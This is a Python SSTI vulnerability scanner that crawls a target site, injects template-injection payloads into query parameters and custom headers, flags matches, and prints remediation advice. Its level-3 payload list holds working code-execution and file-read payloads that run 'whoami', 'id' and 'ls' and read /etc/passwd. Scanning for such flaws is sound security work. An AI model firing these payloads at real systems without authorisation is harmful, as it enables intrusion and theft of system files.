import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import re

level_1_payloads = [
    "{{7*7}}", 
    "${7*7}", 
    "<%= 7*7 %>", 
    "#{7*7}", 
    "{{ 'a'.upper() }}", 
    "{{ 7*'7' }}",
    "{{ ''.__class__ }}"
]

level_2_payloads = [
    "{{ ''.__class__.__mro__ }}",
    "{{ ''.__class__.__base__ }}",
    "{{ ''.__class__.__dict__ }}",
    "{{ ''.__class__.__mro__[1].__subclasses__() }}",
    "{{ config }}",
    "{{ settings }}"
]

level_3_payloads = [
    "{{ ''.__class__.__mro__[1].__subclasses__()[408]('whoami', shell=True, stdout=-1).communicate() }}",
    "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}",
    "{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}",
    "{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}"
]

header_payloads = level_1_payloads + level_2_payloads[:2]

HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "text/html,application/xhtml+xml",
}

visited_urls = set()

class SSTIScanner:
    def __init__(self):
        self.scan_results = []
        self.vulnerability_level = 0  # 0 = none, 1 = basic, 2 = intermediate, 3 = critical

    def log_result(self, message):
        self.scan_results.append(message)

    def crawl(self, url, depth=2):
        if depth == 0 or url in visited_urls:
            return
        visited_urls.add(url)
        self.log_result(f"Crawling: {url}")
        try:
            response = requests.get(url, headers=HEADERS, timeout=5)
            soup = BeautifulSoup(response.text, "html.parser")
            for link in soup.find_all("a", href=True):
                next_url = urljoin(url, link["href"])
                if urlparse(next_url).netloc == urlparse(url).netloc:
                    self.test_ssti(next_url)
                    self.crawl(next_url, depth - 1)
        except requests.RequestException:
            pass

    def test_ssti(self, url):
        self.log_result(f"Testing URL: {url}")
        if self.extract_params_and_test(url, level_1_payloads, "Basic"):
            self.vulnerability_level = max(self.vulnerability_level, 1)
            return True
        if self.extract_params_and_test(url, level_2_payloads, "Intermediate"):
            self.vulnerability_level = max(self.vulnerability_level, 2)
            return True
        if self.extract_params_and_test(url, level_3_payloads, "Advanced"):
            self.vulnerability_level = max(self.vulnerability_level, 3)
            return True
        for payload in header_payloads:
            if self.test_headers(url, payload):
                self.vulnerability_level = max(self.vulnerability_level, 1)
                return True
        return False

    def extract_params_and_test(self, url, payloads, level):
        try:
            response = requests.get(url, headers=HEADERS, timeout=5)
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            for param in query_params:
                for payload in payloads:
                    injected_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{param}={payload}"
                    if self.analyze_response(requests.get(injected_url, headers=HEADERS, timeout=5), injected_url, "GET", payload, level):
                        return True
        except requests.RequestException:
            pass
        return False

    def test_headers(self, url, payload):
        headers_with_payload = HEADERS.copy()
        headers_with_payload.update({
            "X-Debug-Info": payload,
            "X-User-Info": payload,
        })
        try:
            response = requests.get(url, headers=headers_with_payload, timeout=5)
            return self.analyze_response(response, url, "HEADER", payload, "Basic")
        except requests.RequestException:
            pass
        return False

    def analyze_response(self, response, url, method, payload, level):
        detection_patterns = [
            r'49',
            r'root:x:0',
            r'__class__',
            r'__subclasses__',
            r'os\.popen',
            r'TemplateSyntaxError',
            r'config',
            r'uid=\d+\([^)]+\)'
        ]
        for pattern in detection_patterns:
            if re.search(pattern, response.text):
                result = f"[{level.upper()}] SSTI Detected at {url} via {method} with payload: {payload}"
                self.log_result(result)
                return True
        if response.status_code == 500:
            result = f"[POSSIBLE] Possible SSTI Error Detected at {url} via {method}"
            self.log_result(result)
            return True
        return False

    def get_remediation_advice(self):
        advice = "\n\n=== SECURITY RECOMMENDATIONS ==="
        
        if self.vulnerability_level >= 1:
            advice += "\n\n[Basic SSTI Detected]"
            advice += "\n1. Sanitize all user input before processing in templates"
            advice += "\n2. Use context-aware escaping for template variables"
            advice += "\n3. Disable template debugging in production environments"
        
        if self.vulnerability_level >= 2:
            advice += "\n\n[Intermediate SSTI Detected - Class/Object Access]"
            advice += "\n1. Restrict access to Python built-ins in template engines"
            advice += "\n2. Implement a sandboxed template environment"
            advice += "\n3. Use template engines with strict sandboxing (like Jinja2 with sandbox)"
            advice += "\n4. Review all template files for direct Python object access"
        
        if self.vulnerability_level >= 3:
            advice += "\n\n[CRITICAL SSTI Detected - RCE Potential]"
            advice += "\n1. IMMEDIATELY patch the vulnerable endpoint"
            advice += "\n2. Consider disabling the affected functionality until fixed"
            advice += "\n3. Audit server for potential compromise (check logs, user accounts)"
            advice += "\n4. Implement Web Application Firewall rules to block SSTI payloads"
            advice += "\n5. Conduct a thorough security review of all template processing"
        
        advice += "\n\nGeneral Best Practices:"
        advice += "\n- Keep template engines updated to latest secure versions"
        advice += "\n- Implement Content Security Policy (CSP) headers"
        advice += "\n- Regularly audit template files for vulnerabilities"
        advice += "\n- Educate developers about secure template practices"
        
        return advice

    def scan_application(self, base_url, depth=2):
        self.log_result(f"Starting scan on {base_url}")
        if self.test_ssti(base_url):
            self.log_result("SSTI vulnerability found! Stopping scan.")
            results = "\n".join(self.scan_results)
            results += self.get_remediation_advice()
            return results
        self.crawl(base_url, depth)
        self.log_result("Scan completed.")
        if self.vulnerability_level > 0:
            results = "\n".join(self.scan_results)
            results += self.get_remediation_advice()
            return results
        return "\n".join(self.scan_results)

def scan_application(target, depth=2):
    scanner = SSTIScanner()
    return scanner.scan_application(target, depth)

'''
target=input("Enter the url:")
temp=scan_application(target,depth=2)
print(temp)'''